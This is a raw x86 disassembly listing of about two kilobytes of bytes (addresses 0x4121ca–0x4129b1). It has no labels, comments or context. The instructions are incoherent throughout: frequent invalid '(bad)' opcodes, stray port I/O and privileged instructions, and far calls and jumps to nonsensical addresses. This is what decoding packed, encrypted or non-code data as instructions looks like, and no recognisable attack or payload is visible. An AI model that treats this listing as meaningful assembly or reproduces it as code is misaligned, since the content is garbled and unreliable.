  4121ca:	xlat   BYTE PTR ds:[ebx]
  4121cb:	icebp  
  4121cc:	adc    eax,0xd3e095c9
  4121d1:	ins    DWORD PTR es:[edi],dx
  4121d2:	fst    QWORD PTR [edx-0x72]
  4121d5:	mov    ecx,DWORD PTR [ebp-0x6]
  4121d8:	fild   WORD PTR [esi-0x7a]
  4121db:	mov    eax,0x20e60560
  4121e0:	dec    ecx
  4121e1:	jecxz  0x4121f4
  4121e3:	push   esi
  4121e4:	call   FWORD PTR [ecx-0x6e8c72e1]
  4121ea:	mov    fs,edx
  4121ec:	dec    ebp
  4121ed:	lfs    esp,FWORD PTR [ebx+0x69743edc]
  4121f4:	cmp    BYTE PTR [ebp+esi*4-0x24ef4f2f],0x9e
  4121fc:	xchg   BYTE PTR ds:0x73185f67,ah
  412202:	mov    al,ch
  412204:	imul   edi,ecx,0xffffffaa
  412207:	das    
  412208:	add    ebx,DWORD PTR [eax-0x40]
  41220b:	jb     0x4121a8
  41220d:	and    bh,BYTE PTR [esi-0xdab5ada]
  412213:	popf   
  412214:	mov    ecx,0xcba60476
  412219:	xor    eax,0x96a0295e
  41221e:	jmp    edi
  412220:	push   ecx
  412221:	jmp    0x8e4a32c1
  412226:	and    DWORD PTR [esi],0x26
  412229:	push   0x2
  41222b:	aaa    
  41222c:	inc    ecx
  41222d:	int    0x97
  41222f:	mov    fs,edx
  412231:	nop
  412232:	jb     0x4121fb
  412234:	lahf   
  412235:	jl     0x4122a2
  412237:	xchg   ebx,eax
  412238:	jmp    0x412271
  41223a:	xchg   DWORD PTR [eax-0x47],edx
  41223d:	cmp    BYTE PTR [edi-0x68],ah
  412240:	jmp    0x2db674f8
  412245:	xor    dh,BYTE PTR [esi-0x6]
  412248:	dec    esp
  412249:	loopne 0x4121d5
  41224b:	outs   dx,BYTE PTR ds:[esi]
  41224c:	idiv   BYTE PTR [edx]
  41224e:	add    eax,0x2ce9b2cd
  412253:	mov    eax,0x1bcc6f56
  412258:	adc    DWORD PTR [eax],esi
  41225a:	enter  0xcaa2,0xb4
  41225e:	jge    0x412226
  412260:	jo     0x412262
  412262:	enter  0x3f60,0x36
  412266:	dec    ecx
  412267:	sub    edx,DWORD PTR ds:0x32052359
  41226d:	test   al,0xce
  41226f:	jae    0x412235
  412271:	push   ecx
  412272:	in     al,0x4f
  412274:	mov    ds:0x7f564e4,eax
  412279:	cmc    
  41227a:	sub    ah,cl
  41227c:	rcr    BYTE PTR [edi-0x47],cl
  41227f:	imul   esi,eax,0x7
  412282:	loop   0x412221
  412284:	(bad)  [edx+0x2a98922]
  41228a:	icebp  
  41228b:	hlt    
  41228c:	xor    BYTE PTR [edx+0x7d],dh
  41228f:	in     eax,dx
  412290:	add    ah,BYTE PTR [esi]
  412292:	arpl   cx,bx
  412294:	inc    ecx
  412295:	dec    ecx
  412296:	mov    ch,0xb7
  412298:	push   esi
  412299:	cmovle ebp,DWORD PTR [ebp+0x7e]
  41229d:	daa    
  41229e:	sbb    esp,DWORD PTR [ebx+0x1e]
  4122a1:	push   ebp
  4122a2:	lods   eax,DWORD PTR ds:[esi]
  4122a3:	sbb    ch,BYTE PTR [edx]
  4122a5:	sbb    edi,DWORD PTR [ebp-0x7f135c90]
  4122ab:	inc    eax
  4122ac:	jmp    0xc7d79cca
  4122b1:	mov    edx,0x6c48372a
  4122b6:	mov    eax,ds:0xa3a853e3
  4122bb:	hlt    
  4122bc:	jecxz  0x41227d
  4122be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122c0:	sbb    al,0xdb
  4122c2:	push   esi
  4122c3:	lock adc eax,DWORD PTR [esi]
  4122c6:	cmp    al,0x87
  4122c8:	push   edx
  4122c9:	adc    BYTE PTR ds:0x1d60b14,ch
  4122cf:	out    dx,eax
  4122d0:	push   eax
  4122d1:	int    0xba
  4122d3:	repz daa 
  4122d5:	or     eax,DWORD PTR [eax-0x34981811]
  4122db:	lahf   
  4122dc:	adc    ebp,DWORD PTR [ebx-0x1]
  4122df:	jmp    0x4228f883
  4122e4:	(bad)  
  4122e5:	je     0x41230b
  4122e7:	fsubr  st,st(7)
  4122e9:	int3   
  4122ea:	jg     0x412299
  4122ec:	dec    ebp
  4122ed:	ja     0x412331
  4122ef:	dec    edx
  4122f0:	adc    esp,DWORD PTR [edx]
  4122f2:	adc    ebx,DWORD PTR [esi-0x33a71ac0]
  4122f8:	adc    eax,DWORD PTR [eax+0x3e]
  4122fb:	add    al,0xe6
  4122fd:	nop
  4122fe:	loope  0x4122b5
  412300:	or     al,0x87
  412302:	cdq    
  412303:	mov    bl,0x9d
  412305:	push   ebp
  412306:	into   
  412307:	jp     0x412360
  412309:	push   0x38
  41230b:	repz sbb al,0x29
  41230e:	mov    esp,ecx
  412310:	arpl   WORD PTR [ebx*4-0x2f5e373e],sp
  412317:	scas   eax,DWORD PTR es:[edi]
  412318:	jl     0x41230d
  41231a:	adc    eax,0x17feea6a
  41231f:	or     ebp,DWORD PTR [ebp+0x24]
  412322:	mov    cl,0xeb
  412324:	add    esi,DWORD PTR [eax-0x21]
  412327:	add    dh,al
  412329:	arpl   WORD PTR [edi+0x62640226],si
  41232f:	dec    ecx
  412330:	sbb    eax,0x7f5e60cc
  412335:	fidivr DWORD PTR [ebp-0x64c68925]
  41233b:	shl    BYTE PTR [ecx+0x9c44fdf],cl
  412341:	leave  
  412342:	push   edx
  412343:	in     al,dx
  412344:	(bad)  
  412345:	mov    ebx,0x7ff9312d
  41234a:	cdq    
  41234b:	sbb    al,0xa7
  41234d:	inc    edx
  41234e:	(bad)  
  412350:	idiv   BYTE PTR [ebx-0x6fdb0121]
  412356:	adc    ebp,eax
  412358:	add    DWORD PTR [ebp+0xec2eb67],0xdbec80f2
  412362:	add    edi,DWORD PTR [edx+ebp*1-0x33]
  412366:	ja     0x41237f
  412368:	out    0x70,al
  41236a:	sub    eax,0x3cf2b2e6
  41236f:	loope  0x41233e
  412371:	mov    al,ds:0xddbe26b4
  412376:	pop    ebx
  412377:	add    BYTE PTR [edi-0x4f987f4a],ch
  41237d:	leave  
  41237e:	pushf  
  41237f:	int3   
  412380:	pushf  
  412381:	add    eax,0x3d79d621
  412386:	outs   dx,BYTE PTR ds:[esi]
  412387:	push   esp
  412388:	idiv   DWORD PTR [eax]
  41238a:	xchg   edi,eax
  41238b:	sub    ebp,edi
  41238d:	jl     0x41231b
  41238f:	lods   al,BYTE PTR ds:[esi]
  412390:	test   DWORD PTR [ecx+0x6230d46a],0xd148e75c
  41239a:	jae    0x4123af
  41239c:	xor    al,0xe0
  41239e:	push   ds
  41239f:	inc    edi
  4123a0:	daa    
  4123a1:	lock sub bl,cl
  4123a4:	dec    esi
  4123a5:	pusha  
  4123a6:	jge    0x4123d2
  4123a8:	xor    bh,bl
  4123aa:	pop    edx
  4123ab:	gs aad 0xf8
  4123ae:	aas    
  4123af:	add    BYTE PTR [ebx],0x86
  4123b2:	jl     0x41242f
  4123b4:	fisttp WORD PTR fs:[ecx-0x2a2bb107]
  4123bb:	lods   al,BYTE PTR ds:[esi]
  4123bc:	daa    
  4123bd:	test   DWORD PTR [ebp+esi*4-0x2b8366d4],ebx
  4123c4:	xor    DWORD PTR [ecx+ebx*4+0x66a99970],eax
  4123cb:	fwait
  4123cc:	and    bl,al
  4123ce:	data16 outs dx,BYTE PTR ds:[esi]
  4123d0:	lock stos DWORD PTR es:[edi],eax
  4123d2:	in     eax,0xdd
  4123d4:	mov    eax,ds:0xdf60c010
  4123d9:	push   ss
  4123da:	popa   
  4123db:	sbb    DWORD PTR ds:0x43244265,ebp
  4123e1:	push   eax
  4123e2:	mov    ch,0xe9
  4123e4:	mov    edx,0xc4d0eb16
  4123e9:	rcr    DWORD PTR [ebp+0x56],1
  4123ec:	xchg   esi,eax
  4123ed:	ins    BYTE PTR es:[edi],dx
  4123ee:	out    0x6d,al
  4123f0:	push   esi
  4123f1:	fsub   QWORD PTR [esi-0xa]
  4123f4:	cwde   
  4123f5:	out    0xa3,eax
  4123f7:	pop    ecx
  4123f8:	or     eax,DWORD PTR [edx-0x5941abed]
  4123fe:	scas   eax,DWORD PTR es:[edi]
  4123ff:	push   ss
  412400:	adc    bh,ah
  412402:	popa   
  412403:	jmp    0x4123a0
  412405:	pop    esi
  412406:	and    DWORD PTR [ebp+0x1fb69f2b],ebx
  41240c:	fistp  QWORD PTR [edi]
  41240e:	sbb    bl,dl
  412410:	popa   
  412411:	push   es
  412412:	or     edx,DWORD PTR [ebx-0xcc27b6]
  412418:	mov    BYTE PTR [edi],dh
  41241a:	sub    ebx,DWORD PTR [edx-0x7a]
  41241d:	mov    cl,0xf2
  41241f:	push   edx
  412420:	pop    edx
  412421:	repnz sti 
  412423:	mov    ah,0x0
  412425:	xchg   edi,eax
  412426:	xchg   ecx,eax
  412427:	pop    ebx
  412428:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412429:	stos   BYTE PTR es:[edi],al
  41242a:	adc    bl,BYTE PTR [esi+ebx*8-0x20]
  41242e:	xlat   BYTE PTR ds:[ebx]
  41242f:	call   0xdccb:0x5c3f801a
  412436:	(bad)  
  412438:	inc    ecx
  412439:	or     DWORD PTR [edi-0x4c],edi
  41243c:	mov    ch,0x70
  41243e:	push   esp
  41243f:	lahf   
  412440:	mov    edi,0xc71aca82
  412445:	pop    es
  412446:	into   
  412447:	(bad)  
  412448:	jns    0x41249a
  41244a:	xor    BYTE PTR [ebx-0x45],ah
  41244d:	fidivr WORD PTR [edi]
  41244f:	mov    edi,0xa9ee8e6b
  412454:	sub    DWORD PTR [eax-0x55],ecx
  412457:	daa    
  412458:	mov    ch,0xf4
  41245a:	jae    0x41242e
  41245c:	sbb    esp,DWORD PTR [ebx-0x2f5c8eda]
  412462:	outs   dx,DWORD PTR ds:[esi]
  412463:	pop    edi
  412464:	retf   
  412465:	sbb    eax,0xa6c53fe5
  41246a:	mov    esp,DWORD PTR ds:0xf72e9c48
  412470:	mov    eax,ds:0x46ba6786
  412475:	fisubr DWORD PTR [ecx+0x6b]
  412478:	in     eax,dx
  412479:	jae    0x41242e
  41247b:	int3   
  41247c:	aas    
  41247d:	or     DWORD PTR [ebx+0x52118ea4],0xe
  412484:	mov    eax,ds:0xfb1a55e4
  412489:	mov    ecx,0x780fbfdb
  41248e:	jl     0x412465
  412490:	mov    ebp,0x30b59083
  412495:	xchg   esi,eax
  412496:	cli    
  412497:	ins    DWORD PTR es:[edi],dx
  412498:	mov    ecx,DWORD PTR [edx]
  41249a:	ins    BYTE PTR es:[edi],dx
  41249b:	and    esp,edx
  41249d:	lds    esi,FWORD PTR [ebp-0x4444cb50]
  4124a3:	mov    al,ds:0xeae552c2
  4124a8:	frstor [edx-0x51f6f607]
  4124ae:	ds pop ebx
  4124b0:	mov    DWORD PTR ds:0x4d65b325,edi
  4124b6:	jmp    0x610862f5
  4124bb:	jnp    0x412502
  4124bd:	cmp    al,0x96
  4124bf:	bound  ecx,QWORD PTR [edi-0x16]
  4124c2:	cmp    DWORD PTR [edx+0x266d0a62],edi
  4124c8:	push   es
  4124c9:	dec    eax
  4124ca:	jbe    0x412475
  4124cc:	(bad)  
  4124cd:	pop    ebx
  4124ce:	pop    ds
  4124cf:	adc    eax,0xef3f6913
  4124d4:	or     al,BYTE PTR [ebp-0x310aa419]
  4124da:	push   esp
  4124db:	push   edx
  4124dc:	cwde   
  4124dd:	fadd   QWORD PTR [eax+0x15a6c201]
  4124e3:	xchg   esi,eax
  4124e4:	bound  esi,QWORD PTR [ecx]
  4124e6:	scas   al,BYTE PTR es:[edi]
  4124e7:	dec    eax
  4124e8:	addr16 and eax,0xcbe4d2cd
  4124ee:	add    esi,ecx
  4124f0:	fnstsw WORD PTR [eax-0x788bff0c]
  4124f6:	cmp    DWORD PTR [edi],ebp
  4124f8:	hlt    
  4124f9:	cmp    BYTE PTR [esi],0x1c
  4124fc:	fild   WORD PTR ds:0xab4cbdcf
  412502:	push   cs
  412503:	sbb    BYTE PTR [edx],0x6e
  412506:	xchg   ch,ch
  412508:	jecxz  0x412581
  41250a:	add    eax,0xf4c51669
  41250f:	rcr    BYTE PTR [eax+0x7e744f83],cl
  412515:	popf   
  412516:	je     0x412536
  412518:	cdq    
  412519:	mov    ebx,0x3b25975
  41251e:	mov    dl,0xc5
  412520:	ror    BYTE PTR [edi+0x2e],0x5f
  412524:	int3   
  412525:	addr16 pusha 
  412527:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412528:	sbb    DWORD PTR [ebx+0x7b00a676],ecx
  41252e:	test   eax,0xbd666eb8
  412533:	inc    ebx
  412534:	sub    DWORD PTR [edx],eax
  412536:	mov    dl,0x7a
  412538:	mov    esi,0x14e3f130
  41253d:	frstor [edi+ebp*1]
  412540:	data16 test al,0xb2
  412543:	pop    es
  412544:	shr    DWORD PTR [edi-0x77ba3a08],1
  41254a:	out    0x5c,eax
  41254c:	jmp    0xd43:0x39a9b8b4
  412553:	(bad)  [eax]
  412555:	addr16 sbb eax,ecx
  412558:	test   DWORD PTR [ebx+0xa],0xa290e4ea
  41255f:	sar    DWORD PTR [ecx-0x67],cl
  412562:	jle    0x4124f5
  412564:	imul   ebx,DWORD PTR [ebp-0x68],0x37066ef
  41256b:	push   ss
  41256c:	xchg   DWORD PTR [ebp+0x363ba68f],ebx
  412572:	sbb    ebx,ebp
  412574:	xchg   DWORD PTR [eax],ebp
  412576:	xor    al,0x64
  412578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412579:	cs jae 0x41258a
  41257c:	(bad)  [esi+0xd]
  41257f:	push   esp
  412580:	dec    eax
  412581:	mov    DWORD PTR [edi],ebx
  412583:	aas    
  412584:	or     eax,edi
  412586:	loop   0x4125fb
  412588:	call   0x8ba8:0x44b43d5b
  41258f:	push   cs
  412590:	fisubr WORD PTR [ecx-0x74ae8895]
  412596:	es xor al,0x17
  412599:	mov    bl,0x4
  41259b:	push   ebp
  41259c:	out    0x9c,eax
  41259e:	les    eax,FWORD PTR [ecx]
  4125a0:	xlat   BYTE PTR ds:[ebx]
  4125a1:	sub    bl,0x7b
  4125a4:	popf   
  4125a5:	aas    
  4125a6:	or     bl,BYTE PTR ds:0xde7434e4
  4125ac:	mov    ds,WORD PTR [ebx]
  4125ae:	or     eax,0x971b7c89
  4125b3:	stos   DWORD PTR es:[edi],eax
  4125b4:	lock mov ch,0x97
  4125b7:	cmc    
  4125b8:	fistp  DWORD PTR [ebp-0x157d41fb]
  4125be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125bf:	adc    al,0x2f
  4125c1:	dec    ebp
  4125c2:	adc    edx,DWORD PTR [ebx-0x47]
  4125c5:	inc    edx
  4125c6:	and    DWORD PTR [ebx-0x3f224687],ebp
  4125cc:	xor    eax,0x48f934ee
  4125d1:	jae    0x4125db
  4125d3:	loope  0x4125cc
  4125d5:	xchg   BYTE PTR [ebp-0x4e43a554],bh
  4125db:	loop   0x412570
  4125dd:	lea    eax,[esi+0x56750fd3]
  4125e3:	push   esp
  4125e4:	fnstenv [ebp+edi*8-0x15ebe899]
  4125eb:	lods   al,BYTE PTR ds:[esi]
  4125ec:	ds jmp 0x4125a9
  4125ef:	dec    eax
  4125f0:	xor    BYTE PTR [esp+ecx*1-0x1a],0xe
  4125f5:	(bad)  
  4125f6:	stos   DWORD PTR es:[edi],eax
  4125f7:	push   es
  4125f8:	xchg   esi,eax
  4125f9:	mov    bh,0xca
  4125fb:	test   eax,0xdb3a6ed
  412600:	mov    esi,edi
  412602:	lock mov fs,edx
  412605:	dec    ebp
  412606:	pop    ebp
  412607:	(bad)  
  412608:	fsubr  DWORD PTR [edx+0x158d339c]
  41260e:	out    0x72,eax
  412610:	dec    esi
  412611:	xor    eax,0xab60fa78
  412616:	mov    al,ds:0xfe745665
  41261b:	add    dl,bh
  41261d:	gs stos DWORD PTR es:[edi],eax
  41261f:	daa    
  412620:	dec    esp
  412621:	mov    dh,0x38
  412623:	cmp    DWORD PTR [edx],ebx
  412625:	xor    eax,0x89f4b8ef
  41262a:	repz add al,0x42
  41262d:	imul   edx,eax,0xbe13d85d
  412633:	cwde   
  412634:	jno    0x412618
  412636:	xchg   ebx,eax
  412637:	fistp  DWORD PTR [ecx+ebx*4-0xa]
  41263b:	aas    
  41263c:	mov    dl,0x5
  41263e:	jl     0x412610
  412640:	inc    edx
  412641:	retf   
  412642:	xchg   cl,al
  412644:	lock cwde 
  412646:	mov    ds,ebx
  412648:	sbb    esi,DWORD PTR [ebp+0xdebc7ad]
  41264e:	scas   eax,DWORD PTR es:[edi]
  41264f:	pop    es
  412650:	loopne 0x41269e
  412652:	push   eax
  412653:	js     0x412683
  412655:	lods   eax,DWORD PTR ds:[esi]
  412656:	add    eax,0x9303e032
  41265b:	scas   eax,DWORD PTR es:[edi]
  41265c:	cld    
  41265d:	mov    ebx,0x31a4ad6a
  412662:	cmp    al,0xeb
  412664:	cmp    al,0xd8
  412666:	xor    DWORD PTR ds:0x2067aaa2,0x62f4b70b
  412670:	mov    ebx,0x6373b53c
  412675:	mov    bl,0xb8
  412677:	jmp    0xd746eaa5
  41267c:	jno    0x4126c6
  41267e:	xor    ecx,DWORD PTR [ebx-0x22]
  412681:	mov    esi,0xe47e1f58
  412686:	push   edi
  412687:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412688:	pop    es
  412689:	jle    0x4126f0
  41268b:	sti    
  41268c:	push   0xffffffb2
  41268e:	shr    DWORD PTR [ebx+0x481bb991],1
  412694:	call   0xb9f8:0xf58d2ef8
  41269b:	adc    DWORD PTR [ecx+0x7f],esi
  41269e:	aas    
  41269f:	and    BYTE PTR [eax],ah
  4126a1:	lahf   
  4126a2:	cwde   
  4126a3:	(bad)  
  4126a4:	repz sti 
  4126a6:	out    dx,al
  4126a7:	sub    ecx,DWORD PTR [esi]
  4126a9:	sbb    DWORD PTR [ebx-0x7d],0xffffffa5
  4126ad:	loopne 0x41271c
  4126af:	mov    WORD PTR [ebp+0x2c9ff4bb],?
  4126b5:	call   0x853146c3
  4126ba:	mov    dl,0x3f
  4126bc:	xor    ecx,edi
  4126be:	pop    esp
  4126bf:	xor    dh,BYTE PTR [edi]
  4126c1:	rcr    bh,0x3d
  4126c4:	lds    edi,FWORD PTR [edi]
  4126c6:	mul    ecx
  4126c8:	call   0x917360cb
  4126cd:	add    al,0x44
  4126cf:	or     ebp,DWORD PTR [ebx+0xccf4bc1]
  4126d5:	retf   
  4126d6:	aaa    
  4126d7:	rcl    DWORD PTR [esi],cl
  4126d9:	pop    edi
  4126da:	jmp    0x4126ba
  4126dc:	lods   eax,DWORD PTR ds:[esi]
  4126dd:	jbe    0x4126e1
  4126df:	das    
  4126e0:	pop    esi
  4126e1:	jl     0x4126c6
  4126e3:	jge    0x412681
  4126e5:	cmp    DWORD PTR [esi+0x5b],esp
  4126e8:	aas    
  4126e9:	je     0x41266f
  4126eb:	leave  
  4126ec:	pusha  
  4126ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126ee:	jmp    0x7bcce6e6
  4126f3:	mov    WORD PTR [edi+0x15],?
  4126f6:	add    eax,DWORD PTR [esi]
  4126f8:	lds    ebp,FWORD PTR [eax]
  4126fa:	mov    eax,0x3f43709d
  4126ff:	iret   
  412700:	stos   BYTE PTR es:[edi],al
  412701:	aaa    
  412702:	call   0x27f1ec43
  412707:	dec    edi
  412708:	jb     0x412708
  41270a:	sub    al,0x69
  41270c:	xchg   edx,eax
  41270d:	retf   0x771b
  412710:	push   0x3f
  412712:	pop    edx
  412713:	(bad)  
  412714:	adc    eax,0x7cd04094
  412719:	iret   
  41271a:	dec    ecx
  41271b:	pop    esi
  41271c:	push   cs
  41271d:	mov    dh,0xf7
  41271f:	fs pop ss
  412721:	xchg   ebp,eax
  412722:	in     al,dx
  412723:	cs push esi
  412725:	mov    ebp,0x257c8422
  41272a:	mov    esi,0x58a52129
  41272f:	mov    cl,0x42
  412731:	les    ebx,FWORD PTR [ebx-0x43]
  412734:	mov    al,ds:0x75ea2cd5
  412739:	outs   dx,DWORD PTR ds:[esi]
  41273a:	mov    esi,ecx
  41273c:	lods   eax,DWORD PTR ds:[esi]
  41273d:	push   0xbedf9c0a
  412742:	add    esi,DWORD PTR [ebp-0xf]
  412745:	and    eax,0xa10c1d21
  41274a:	sar    DWORD PTR [ecx],1
  41274c:	cs xchg edx,eax
  41274e:	(bad)  
  41274f:	and    ebx,DWORD PTR [esi+0x7d]
  412752:	js     0x41277e
  412754:	mov    ebp,ebp
  412756:	mov    ch,0x8e
  412758:	in     eax,0xfd
  41275a:	jmp    0x412720
  41275c:	xor    esp,DWORD PTR [ebx-0x4d3c2215]
  412762:	and    dl,BYTE PTR [ebp+eiz*4+0x6d]
  412766:	mov    esi,0xbfcbafbc
  41276b:	sub    eax,0x82e43f8f
  412770:	lods   eax,DWORD PTR ds:[esi]
  412771:	inc    ecx
  412772:	fistp  QWORD PTR [ecx]
  412774:	ja     0x412742
  412776:	(bad)  
  412777:	arpl   WORD PTR [edi-0x2d],cx
  41277a:	cwde   
  41277b:	inc    edi
  41277c:	mov    edi,0x25bf242e
  412781:	aam    0xf9
  412783:	loope  0x412753
  412785:	mov    ch,BYTE PTR [edi-0x3d99c19f]
  41278b:	pop    esp
  41278c:	xor    al,0xf0
  41278e:	in     eax,dx
  41278f:	jnp    0x41273c
  412791:	jns    0x4127a2
  412793:	test   dh,ah
  412795:	mov    eax,ds:0x765fad73
  41279a:	jb     0x412769
  41279c:	out    0xc4,eax
  41279e:	test   BYTE PTR [esi],dl
  4127a0:	jle    0x41272b
  4127a2:	retf   0xc7e2
  4127a5:	mov    edi,gs
  4127a7:	add    edi,eax
  4127a9:	test   al,0x3d
  4127ab:	mov    ch,0x8
  4127ad:	mov    eax,0xebe97c54
  4127b2:	pop    ss
  4127b3:	scas   eax,DWORD PTR es:[edi]
  4127b4:	cmp    bl,BYTE PTR [esi]
  4127b6:	mov    BYTE PTR [ebp-0x7e],cl
  4127b9:	sub    ebx,DWORD PTR [ecx+0x3df46437]
  4127bf:	inc    ebp
  4127c0:	dec    esi
  4127c1:	outs   dx,DWORD PTR ds:[esi]
  4127c2:	je     0x4127db
  4127c4:	cmp    eax,0xda89584d
  4127c9:	hlt    
  4127ca:	pop    es
  4127cb:	cmp    BYTE PTR [edx-0x5c2d9b6a],bh
  4127d1:	leave  
  4127d2:	loop   0x412818
  4127d4:	push   ss
  4127d5:	sti    
  4127d6:	xchg   edi,eax
  4127d7:	xchg   BYTE PTR [ebp-0x4a],bh
  4127da:	adc    dh,BYTE PTR [ebp-0x33add3cf]
  4127e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127e1:	push   eax
  4127e2:	imul   eax,esi,0xffffffa8
  4127e5:	stos   DWORD PTR es:[edi],eax
  4127e6:	cmp    ah,BYTE PTR [edi]
  4127e8:	cdq    
  4127e9:	push   ebp
  4127ea:	idiv   BYTE PTR [eax+ebx*1]
  4127ed:	dec    ebx
  4127ee:	pop    eax
  4127ef:	push   ss
  4127f0:	hlt    
  4127f1:	cdq    
  4127f2:	mov    esp,0x3729dbbd
  4127f7:	push   ebx
  4127f8:	mov    bh,0xd1
  4127fa:	xchg   DWORD PTR [ecx],esi
  4127fc:	mul    DWORD PTR [esi+0xd]
  4127ff:	sbb    bh,bl
  412801:	les    ebx,FWORD PTR [esi+0x64f12c0a]
  412807:	mov    bl,0x28
  412809:	ss (bad) 
  41280b:	pushf  
  41280c:	add    edi,esi
  41280e:	int    0x27
  412810:	fldcw  WORD PTR [esi+0x1422f93d]
  412816:	mov    DWORD PTR [esi],ebx
  412818:	push   edi
  412819:	aas    
  41281a:	stc    
  41281b:	push   0x1c7f7cdc
  412820:	stos   DWORD PTR es:[edi],eax
  412821:	pop    eax
  412822:	mov    ds:0xbee4842a,eax
  412827:	push   cs
  412828:	clc    
  412829:	test   BYTE PTR ds:0xa7316445,0x75
  412830:	sub    BYTE PTR [esi-0x408359b2],dl
  412836:	xchg   cl,ch
  412838:	fidiv  WORD PTR [ecx+0x7e41cd27]
  41283e:	push   eax
  41283f:	(bad)  
  412840:	(bad)  
  412841:	call   0x3d6ae1bb
  412846:	and    eax,0x1832c9bf
  41284b:	xor    BYTE PTR [ebx+0x5b],dl
  41284e:	xor    edx,DWORD PTR [edx]
  412850:	in     eax,dx
  412851:	or     eax,0x76cf37f3
  412856:	sbb    eax,0xe918db56
  41285b:	addr16 pop esi
  41285d:	jo     0x412861
  41285f:	je     0x41281f
  412861:	cwde   
  412862:	jae    0x41280f
  412864:	ficomp WORD PTR [ebp+0x1718dfa8]
  41286a:	dec    esp
  41286b:	(bad)  
  41286c:	or     al,0x1a
  41286e:	outs   dx,BYTE PTR ds:[esi]
  41286f:	push   ebp
  412870:	jge    0x4127fa
  412872:	jmp    0xb6d9e9a
  412877:	or     al,0x12
  412879:	adc    edx,ebx
  41287b:	xor    bl,BYTE PTR [ebp-0x30141bb7]
  412881:	test   al,0xfd
  412883:	lods   eax,DWORD PTR ds:[esi]
  412884:	cmp    dh,dl
  412886:	add    esp,ecx
  412888:	leave  
  412889:	xchg   edi,eax
  41288a:	dec    edi
  41288b:	dec    edi
  41288c:	(bad)  
  41288d:	mov    WORD PTR [edx+0x9],ds
  412890:	push   edx
  412891:	adc    esp,DWORD PTR [esi+0x37]
  412894:	cmc    
  412895:	mov    ch,0x53
  412897:	sbb    BYTE PTR [ecx+eiz*4-0x48fae1ce],ah
  41289e:	adc    BYTE PTR [esi-0x21be4606],ah
  4128a4:	lea    esi,ds:0xf67c36e9
  4128aa:	pop    ebp
  4128ab:	mov    ecx,0xf7958841
  4128b0:	xchg   BYTE PTR [edx+0x7490d16d],ah
  4128b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128b7:	movsx  ebx,bh
  4128ba:	enter  0x544a,0xc9
  4128be:	sbb    al,0x33
  4128c0:	shr    ebx,0xc3
  4128c3:	mov    dh,0x85
  4128c5:	stos   BYTE PTR es:[edi],al
  4128c6:	outs   dx,DWORD PTR ds:[esi]
  4128c7:	add    BYTE PTR [eax],0xfc
  4128ca:	lock pop ds
  4128cc:	xchg   edi,edx
  4128ce:	int3   
  4128cf:	jle    0x412854
  4128d1:	test   BYTE PTR [ecx],dh
  4128d3:	mov    edi,0x1e6a4bb2
  4128d8:	inc    ecx
  4128d9:	cli    
  4128da:	push   0x60
  4128dc:	call   0xb32e:0x932af324
  4128e3:	sub    BYTE PTR [edi],dh
  4128e5:	pop    eax
  4128e6:	pusha  
  4128e7:	repz test eax,0xeca0cf80
  4128ed:	xlat   BYTE PTR ds:[ebx]
  4128ee:	add    bh,BYTE PTR [ecx+0x35]
  4128f1:	jecxz  0x4128c7
  4128f3:	inc    esi
  4128f4:	mov    BYTE PTR [edx+0x207fd43e],cl
  4128fa:	sbb    BYTE PTR [edx],al
  4128fc:	xor    cl,dh
  4128fe:	mov    eax,0x385797c4
  412903:	inc    eax
  412904:	outs   dx,DWORD PTR ds:[esi]
  412905:	cmp    al,0x39
  412907:	sbb    al,0x88
  412909:	jnp    0x4128ba
  41290b:	into   
  41290c:	div    DWORD PTR [edi]
  41290e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41290f:	hlt    
  412910:	call   0x4905665f
  412915:	loopne 0x41292a
  412917:	inc    ebp
  412918:	add    esi,eax
  41291a:	cmp    DWORD PTR [ebx],eax
  41291c:	xchg   bl,dl
  41291e:	xchg   esi,eax
  41291f:	outs   dx,DWORD PTR ds:[esi]
  412920:	push   edx
  412921:	fucomip st,st(0)
  412923:	pop    DWORD PTR [edx+0x1c]
  412926:	fbstp  TBYTE PTR [esi]
  412928:	push   edx
  412929:	ins    DWORD PTR es:[edi],dx
  41292a:	(bad)
  41292d:	les    ebp,FWORD PTR [edx]
  41292f:	int3   
  412930:	cmp    DWORD PTR [edx-0x47],esi
  412933:	lods   eax,DWORD PTR ds:[esi]
  412934:	(bad)  [ecx]
  412936:	xor    dh,BYTE PTR [esi+ebp*2-0xf]
  41293a:	jle    0x41292d
  41293c:	call   0x3f10:0x37aeaf1c
  412943:	pop    esp
  412944:	shl    BYTE PTR ds:0x8222493d,1
  41294a:	pop    esp
  41294b:	imul   ebp,DWORD PTR ds:0xe65229dc,0x6f80d525
  412955:	mov    fs,WORD PTR ds:0x55cb25a2
  41295b:	add    ebp,edx
  41295d:	les    esi,FWORD PTR cs:[ebp+0x7]
  412961:	sti    
  412962:	(bad)  
  412963:	fild   WORD PTR [eax]
  412965:	push   eax
  412966:	aas    
  412967:	mov    ebp,0x799c1ffa
  41296c:	in     al,0x5
  41296e:	stos   BYTE PTR es:[edi],al
  41296f:	(bad)  
  412970:	dec    edx
  412971:	sbb    edi,edi
  412973:	ret    0xdafd
  412976:	dec    ebx
  412977:	pop    ebp
  412978:	adc    eax,0x53e0ca58
  41297d:	jmp    0x4129b1
  41297f:	xchg   esi,edx
  412981:	mov    edx,0xb6610293
  412986:	lock stc 
  412988:	cmp    esi,eax
  41298a:	sbb    BYTE PTR [edi+ebp*4-0x71],cl
  41298e:	scas   al,BYTE PTR es:[edi]
  41298f:	fst    QWORD PTR [ecx]
  412991:	mov    edi,0x196a766b
  412996:	xchg   BYTE PTR [ebx],dh
  412998:	or     DWORD PTR [ebx-0x3a8a544],edi
  41299e:	xchg   edx,eax
  41299f:	neg    DWORD PTR [eax]
  4129a1:	scas   eax,DWORD PTR es:[edi]
  4129a2:	push   0x21
  4129a4:	mov    esi,0x45696e13
  4129a9:	mov    edi,0x9171d699
  4129ae:	push   eax
  4129af:	loop   0x412982
  4129b1:	xchg   esp,eax
